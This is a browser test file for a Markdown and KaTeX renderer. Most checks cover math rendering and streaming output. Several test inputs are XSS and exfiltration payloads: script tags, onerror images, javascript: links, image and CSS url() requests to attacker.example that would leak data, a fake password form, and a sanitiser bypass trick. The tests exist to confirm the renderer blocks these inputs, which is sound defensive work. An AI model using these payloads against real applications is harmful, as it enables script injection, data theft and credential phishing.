// Kiểm tra static/render.js — mở http://127.0.0.1:8000/render-test.html (đã đăng nhập). Tách khỏi render-test.html
// vì CSP của app (auth.py) không cho script nội tuyến.
const has = (h, s) => h.includes(s);
const count = (h, re) => (h.match(re) || []).length;
// cây DOM của kết quả, dựng trong <template> nên KHÔNG tải gì (thẻ ảnh dựng trong div thường là tải ngay)
const dom = h => { const t = document.createElement("template"); t.innerHTML = h; return t.content; };
// có thẻ/thuộc tính nào làm trình duyệt tự tải hoặc tự chạy mã không
const fetches = h => { const d = dom(h);
  return !!d.querySelector("script, style, img, image, iframe, video, audio, source, embed, object, link, use, [onerror], [onload]")
      || [...d.querySelectorAll("[style]")].some(e => /url\(/i.test(e.getAttribute("style"))); };
const CASES = [
  ["thư viện nạp đủ (static/vendor/)", "x", () => !!(window.marked && window.DOMPurify && window.katex)],
  ["$…$ giữa dòng", "Ta có $\\sqrt{d_k}$ ở mẫu.", h => has(h, 'class="katex"') && !has(h, "$")],
  ["$$…$$ riêng dòng", "$$\\mathrm{softmax}(QK^\\top)V$$", h => has(h, "katex-display")],
  ["\\( \\) và \\[ \\]", "a \\(x_1\\) b \\[\\sum_{i=1}^n i\\]", h => count(h, /class="katex"/g) === 2],
  ["gạch dưới trong LaTeX không bị Markdown biến thành in nghiêng", "$x_1 + y_2$ và $a_b$", h => !has(h, "<em>")],
  ["tiền tệ không bị hiểu là công thức", "Giá $5 và $10 mỗi tháng.", h => !has(h, "katex") && has(h, "$5")],
  ["$ trong code giữ nguyên", "Dùng `$HOME` và\n```\necho $PATH $x_1$\n```",
   h => !has(h, "katex") && has(h, "$HOME") && has(h, "$x_1$")],
  ["bảng Markdown, có công thức trong ô", "| a | b |\n|---|---|\n| 1 | $\\alpha$ |", h => has(h, "<table") && has(h, "katex")],
  // phải viết "<\/script>": thẻ đóng viết thẳng (kể cả trong chú thích) là trình duyệt đóng thẻ script ngay tại đó
  ["HTML thô không thành thẻ: <script>, <img onerror>", "Hi <script>alert(1)<\/script><img src=x onerror=alert(2)>",
   h => !fetches(h) && dom(h).textContent.includes("<script>")],
  ["chặn link javascript:", "[bấm](javascript:alert(1))", h => !has(h, "javascript:")],
  ["ảnh Markdown không tự tải (lối rò dữ liệu)", "Xem ![a](https://attacker.example/?q=bi-mat)", h => !fetches(h)],
  ["style=url(…) trong HTML thô không tự tải", '<span style="background:url(https://attacker.example/x)">hi</span>',
   h => !fetches(h)],
  // Lối lách reviewer tìm ra (11/10/2026): "\`" là dấu ` thường với marked nhưng là mở code với extract() → HTML thô lọt.
  ["HTML thô lách bằng \\` không tự tải", 'ok \\`<div style="background:url(https://attacker.example/leak)">.</div>`',
   h => !fetches(h) && !dom(h).querySelector("div")],
  ["<svg><style> (CSS cho cả trang) bị bỏ", '\\`<svg width=0 height=0><style>body{background:red}</style></svg>`',
   h => !dom(h).querySelector("style")],
  ["form, ô mật khẩu giả bị bỏ", '\\`<form action="https://attacker.example"><input type=password><button>OK</button></form>`',
   h => !dom(h).querySelector("form, input, button")],
  ["khung trùm cả app (position:fixed) bị bỏ", '\\`<a href="#x" style="position:fixed;inset:0">x</a>`',
   h => ![...dom(h).querySelectorAll("[style]")].some(e => /fixed/.test(e.getAttribute("style")))],
  // Thẻ <pre>/<code>/<kbd>/<script> giữa dòng từng bật chế độ "raw" của marked: chữ phía sau không được thoát nữa
  ["thẻ <pre> giữa dòng không làm chữ sau nó thành HTML", '\\`<pre>` text `<b>` \\`<img src=x onerror=alert(1)//` tail >',
   h => !fetches(h) && !dom(h).querySelector("pre, b, img")],
  ["code giữa dòng vắt qua dòng trống không lọt thẻ", "`x\n\na <kbd> b <span style=\"background:url(https://attacker.example/k)\">s</span>`",
   h => !fetches(h) && !dom(h).querySelector("kbd, span[style]")],
  ["code giữa dòng vẫn hiện đúng chữ <tag>", "Dùng `<div class=\"x\">` để bọc.", h => dom(h).querySelector("code")?.textContent === '<div class="x">'],
  ["KaTeX dùng svg (\\sqrt, \\widehat) vẫn dựng đủ", "$\\sqrt{x} + \\widehat{abc}$",
   h => has(h, 'class="katex"') && !!dom(h).querySelector("svg") && !has(h, "cc0000")],
  ["vẫn giữ link thường (phải bấm mới đi)", "[bài gốc](https://arxiv.org/abs/1706.03762)",
   h => !!dom(h).querySelector('a[href="https://arxiv.org/abs/1706.03762"]')],
  ["dấu < > trong chữ thường hiện đúng", "Nếu a < b và c > d thì a<b", h => dom(h).textContent.includes("a < b và c > d thì a<b")],
  ["trích dẫn > vẫn là blockquote", "> Attention is all you need", h => !!dom(h).querySelector("blockquote")],
  ["LaTeX hỏng không nuốt mất câu", "Trước $\\frac{1}{$ sau", h => has(h, "Trước") && has(h, "sau")],
  ["ký tự đặc biệt / tiếng Việt", "Độ phức tạp ≤ O(n²) — “trích” † ‡ → ∑", h => has(h, "O(n²)") && has(h, "†") && has(h, "∑")],
  ["khối code chưa đóng (chữ đang chảy)", "Ví dụ:\n```python\nprint(1)", h => has(h, "<pre>") && has(h, "print(1)")],
  ["hai $$ liền nhau, cái sau đang gõ dở", "$$a+b$$ rồi $$\\frac{1}{",
   h => count(h, /katex-display/g) === 1 && !has(h, "cc0000")],
];
// Chữ chảy từng ký tự: công thức đã đóng thì mọi khung sau vẫn phải còn (không lúc có lúc không),
// công thức $$ đang gõ dở không được hiện lỗi đỏ của KaTeX.
const STREAMS = [
  ["văn xuôi", "Công thức: $\\sqrt{d_k}$ và $QK^\\top$.\n\n$$\\mathrm{Attention}(Q,K,V)=\\mathrm{softmax}\\left(\\frac{QK^\\top}{\\sqrt{d_k}}\\right)V$$\n\nVới $d_k$ lớn thì tích vô hướng lớn.", 4],
  ["bảng", "| Tiêu chí | Dot | Additive |\n|---|---|---|\n| Công thức | $\\frac{QK^\\top}{\\sqrt{d_k}}$ | $W[q;k]$ |\n| Độ phức tạp | $O(n^2 d)$ | $O(n^2 d)$ |\n\n$$\\sum_{i=1}^{n} \\alpha_i v_i$$ xong.", 5],
];

const rows = [];
for (const [name, src, check] of CASES) rows.push([check(renderMarkdown(src)), name]);
for (const [name, full, want] of STREAMS) {
  let prev = 0, drops = 0, red = 0;
  const t0 = performance.now();
  for (let i = 1; i <= full.length; i++) {
    const div = document.createElement("div");
    div.innerHTML = renderMarkdown(full.slice(0, i));
    const n = div.querySelectorAll(".katex").length;
    if (n < prev) drops++;
    if (div.querySelector('[style*="cc0000"]')) red++;
    prev = n;
  }
  const ms = (performance.now() - t0) / full.length;
  rows.push([drops === 0 && red === 0 && prev === want,
    `chảy ${name}, ${full.length} khung: công thức biến mất ${drops} lần, lỗi đỏ ${red} khung, ` +
    `cuối cùng ${prev}/${want} công thức, ${ms.toFixed(2)} ms/khung`]);
}
const fail = rows.filter(r => !r[0]).length;
document.getElementById("out").innerHTML = rows.map(([ok, name]) =>
  `<li class="${ok ? "ok" : "bad"}">${ok ? "✓" : "✗ SAI"} ${name.replace(/[<&]/g, c => c === "<" ? "&lt;" : "&amp;")}</li>`).join("");
document.getElementById("sum").innerHTML = fail
  ? `<span class="bad">${fail}/${rows.length} mục sai</span>` : `<span class="ok">Tất cả ${rows.length} mục đều đạt</span>`;
document.title = fail ? `✗ ${fail} sai – render.js` : "✓ render.js";
